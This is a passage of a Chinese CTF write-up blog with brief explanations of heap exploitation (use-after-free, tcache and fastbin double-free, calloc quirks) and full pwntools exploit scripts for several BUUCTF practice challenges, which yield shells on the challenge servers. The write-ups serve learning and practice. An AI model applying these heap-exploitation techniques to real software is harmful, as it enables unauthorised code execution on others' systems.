class="hljs-comment">#debug()</span><br>r.interactive()<br><br></code></pre></td></tr></table></figure><h3 id="bjdctf-2020-YDSneedGrirlfriend">bjdctf_2020_YDSneedGrirlfriend</h3><p>（uaf）</p><p>利用思路：<br>申请size同为0x20大小的chunk，<br>doublefree<br>申请个不同size的chunk，使从bin链中取出一个0x20<br>位置就置换了，我们就能控制前面图片中说的要改的那个指针的值了<br>我们add 0x20 size，把它改为后门地址<br>然后show就可以了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from LibcSearcher import * </span><br>local_file  = <span class="hljs-string">&#x27;./bjdctf_2020_YDSneedGrirlfriend&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">27737</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,content</span>):<br>        sla(<span class="hljs-string">&#x27;Your choice :&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>        sla(<span class="hljs-string">&#x27;Her name size is :&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>        sa(<span class="hljs-string">&#x27;Her name is :&#x27;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>        sla(<span class="hljs-string">&#x27;Your choice :&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>        sla(<span class="hljs-string">&#x27;Index :&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>        sla(<span class="hljs-string">&#x27;Your choice :&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>        sla(<span class="hljs-string">&#x27;Index :&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-comment">#---------------------------------</span><br>backdoor=<span class="hljs-number">0x400b9c</span><br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<br>free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<br>add(<span class="hljs-number">0x10</span>,p64(backdoor))<br>show(<span class="hljs-number">0</span>)<br><span class="hljs-comment">#debug()</span><br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="gyctf-2020-signin">gyctf_2020_signin</h3><p>参考师傅：<a href="https://blog.csdn.net/yongbaoii/article/details/114242840?ops_request_misc=%7B%22request%5Fid%22%3A%22163603094916780261991969%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&amp;request_id=163603094916780261991969&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-114242840.pc_search_mgc_flag&amp;utm_term=gyctf_2020_signin&amp;spm=1018.2226.3001.4187">yongbaoii</a></p><p>calloc 有以下特性</p><p>不会分配 tcache chunk 中的 chunk 。</p><p>tcache 有以下特性</p><p>在分配 fastbin 中的 chunk 时若还有其他相同大小的 fastbin_chunk 则把它们全部放入 tcache 中。</p><p>大致思路：<br>最终目的就是把bin链写到ptr里<br>就是利用上面的特性，我们要创造个fastbinchunk给他分配，利用uaf改写fd，使fastbin链指向ptr<br>我们add一个，在tcache留个空位，calloc分配一个fastbin，第二个特性把ptr挂入tcachebin，也就是写了点数据<br>（-0x10，估计也是特性，具体位置的话可以调试看看）</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>local_file  = <span class="hljs-string">&#x27;./gyctf_2020_signin&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">26068</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#--------------------------------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">idx</span>):<br>    sla(<span class="hljs-string">&#x27;your choice?&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;idx?\n&#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,content</span>):<br>    sla(<span class="hljs-string">&#x27;your choice?&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;idx?\n&#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br>    sl(content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">idx</span>):<br>    sla(<span class="hljs-string">&#x27;your choice?&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;idx?\n&#x27;</span>,<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-comment">#-------------------------------------------------</span><br>add(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">3</span>)<br>add(<span class="hljs-number">4</span>)<br>add(<span class="hljs-number">5</span>)<br>add(<span class="hljs-number">6</span>)<br>add(<span class="hljs-number">7</span>)<br>free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">2</span>)<br>free(<span class="hljs-number">3</span>)<br>free(<span class="hljs-number">4</span>)<br>free(<span class="hljs-number">5</span>)<br>free(<span class="hljs-number">6</span>)<br>free(<span class="hljs-number">7</span>)<br>edit(<span class="hljs-number">7</span>,p64(<span class="hljs-number">0x4040C0</span>-<span class="hljs-number">0x10</span>))<br>add(<span class="hljs-number">1</span>)<br>sla(<span class="hljs-string">&#x27;your choice?&#x27;</span>, <span class="hljs-string">&#x27;6&#x27;</span>)<br><span class="hljs-comment">#debug()</span><br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="actf-2019-babyheap">actf_2019_babyheap</h3><p>一般有时间的就有system</p><p>没啥好说的<br>可以看我前面的文章：<br><a href="https://blog.csdn.net/m0_51251108/article/details/121141201?spm=1001.2014.3001.5502">https://blog.csdn.net/m0_51251108/article/details/121141201?spm=1001.2014.3001.5502</a></p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>local_file  = <span class="hljs-string">&#x27;./ACTF_2019_babyheap&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;&#x27;</span>, )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#------------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,content</span>):<br>    sla(<span class="hljs-string">&#x27;Your choice: &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;Please input size: \n&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    sa(<span class="hljs-string">&#x27;Please input content: \n&#x27;</span>,content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>    sla(<span class="hljs-string">&#x27;Your choice: &#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;Please input list index: \n&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    sla(<span class="hljs-string">&#x27;Your choice: &#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    sla(<span class="hljs-string">&#x27;Please input list index: \n&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-comment">#------------------------------</span><br>binsh=<span class="hljs-number">0x602010</span><br>system=elf.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<br>free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;bbbb&#x27;</span>)<br>add(<span class="hljs-number">0x10</span>,p64(binsh)+p64(system))<br>show(<span class="hljs-number">0</span>)<br><span class="hljs-comment">#debug()</span><br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="wustctf2020-easyfast">wustctf2020_easyfast</h3><p>这题是libc2.23的doublefree，注意区别<br>引用这位师傅的回顾double free手法</p><p>在glibc2.27之前，主要是fastbin double free：<br>fastbin在free时只会检查现在释放的chunk，是不是开头的chunk，因此可以通过free(C1), free(C2),<br>free(C1)的手法绕过 并在在fastbin取出时，会检查size字段是不是属于这个fastbin，因此往往需要伪造一个size<br>glibc2.27~glibc2.28，主要是tcache double free 相较于fastbin double<br>free，tcache完全没有任何检查，只需要free(C1), free(C1)就可以构造一个环出来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from LibcSearcher import * </span><br>local_file  = <span class="hljs-string">&#x27;./wustctf2020_easyfast&#x27;</span><br>local_libc  = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br>remote_libc = <span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span><br><span class="hljs-comment">#remote_libc = &#x27;/home/glibc-all-in-one/libs/buu/libc-2.23.so&#x27;</span><br>select = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> select == <span class="hljs-number">0</span>:<br>    r = process(local_file)<br>    libc = ELF(local_libc)<br><span class="hljs-keyword">else</span>:<br>    r = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">27879</span> )<br>    libc = ELF(remote_libc)<br>elf = ELF(local_file)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = elf.arch<br>se      = <span class="hljs-keyword">lambda</span> data               :r.send(data)<br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :r.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :r.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :r.recv(numb)<br>rl      = <span class="hljs-keyword">lambda</span>                    :r.recvline()<br>ru      = <span class="hljs-keyword">lambda</span> delims                         :r.recvuntil(delims)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>info    = <span class="hljs-keyword">lambda</span> tag, addr        :r.info(tag + <span class="hljs-string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(addr))<br>o_g_32_old = [<span class="hljs-number">0x3ac3c</span>, <span class="hljs-number">0x3ac3e</span>, <span class="hljs-number">0x3ac42</span>, <span class="hljs-number">0x3ac49</span>, <span class="hljs-number">0x5faa5</span>, <span class="hljs-number">0x5faa6</span>]<br>o_g_32 = [<span class="hljs-number">0x3ac6c</span>, <span class="hljs-number">0x3ac6e</span>, <span class="hljs-number">0x3ac72</span>, <span class="hljs-number">0x3ac79</span>, <span class="hljs-number">0x5fbd5</span>, <span class="hljs-number">0x5fbd6</span>]<br>o_g_old = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]<br>o_g = [<span class="hljs-number">0x45226</span>, <span class="hljs-number">0x4527a</span>, <span class="hljs-number">0xf0364</span>, <span class="hljs-number">0xf1207</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">cmd=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>     gdb.attach(r,cmd)<br><span class="hljs-comment">#-------------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size</span>):<br>        sla(<span class="hljs-string">&#x27;choice&gt;\n&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>        sla(<span class="hljs-string">&#x27;size&gt;\n&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>        sla(<span class="hljs-string">&#x27;choice&gt;\n&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>        sla(<span class="hljs-string">&#x27;index&gt;\n&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,content</span>):<br>        sla(<span class="hljs-string">&#x27;choice&gt;\n&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>        sla(<span class="hljs-string">&#x27;index&gt;\n&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br>        se(content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">backdoor</span>():<br>        sla(<span class="hljs-string">&#x27;choice&gt;\n&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br><span class="hljs-comment">#--------------------------------</span><br>add(<span class="hljs-number">0x40</span>)<span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x40</span>)<span class="hljs-comment">#1</span><br>free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">0</span>)<br><span class="hljs-comment">#add(0x40)</span><br>edit(<span class="hljs-number">0</span>,p64(<span class="hljs-number">0x602080</span>))<br>add(<span class="hljs-number">0x40</span>)<br>add(<span class="hljs-number">0x40</span>)<br>edit(<span class="hljs-number">3</span>,p64(<span class="hljs-number">0</span>))<br>backdoor()<br><span class="hljs-comment">#debug()</span><br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="judgement-mna-2016">judgement_mna_2016</h3><p><a href="https://blog.csdn.net/m0_51251108/article/details/121165338?spm=1001.2014.3001.5502">judgement_mna_2016（32位fmt）_Nqoinaen的博客-CSDN博客</a></p><h3 id="wustctf2020-name-your-dog">wustctf2020_name_your_dog</h3><p><a href="https://blog.csdn.net/m0_51251108/article/details/121167688?spm=1001.2014.3001.5502">wustctf2020_name_your_dog（数组越界劫持got）_Nqoinaen的博客-CSDN博客</a></p><h3 id="hitcon-2018-children-tcache">hitcon_2018_children_tcache</h3><p><a href="https://blog.csdn.net/m0_51251108/article/details/121169047?spm=1001.2014.3001.5502">hitcon_2018_children_tcache（tcache off-by-null，另一种doublefree）_Nqoinaen的博客-CSDN博客</a></p><h3 id="zctf-2016-note3">zctf_2016_note3</h3><p><a href="https://blog.csdn.net/m0_51251108/article/details/121176333?spm=1001.2014.3001.5502">zctf_2016_note3（整数溢出，unlink）_Nqoinaen的博客-CSDN博客</a></p><h3 id="roarctf-2019-realloc-magic">roarctf_2019_realloc_magic</h3><p><a href="https://blog.csdn.net/m0_51251108/article/details/121182007?spm=1001.2014.3001.5502">roarctf_2019_realloc_magic（realloc，IO_file_leak，doublefree）_Nqoinaen的博客-CSDN博客_roarctf_2019_realloc_magic</a></p><h3 id="bcloud-bctf-2016">bcloud_bctf_2016</h3><p><a href="https://blog.csdn.net/m0_51251108/article/details/121216910?spm=1001.2014.3001.5502">bcloud_bctf_2016（32位堆，house-of-force）_Nqoinaen的博客-CSDN博客</a></p><h3 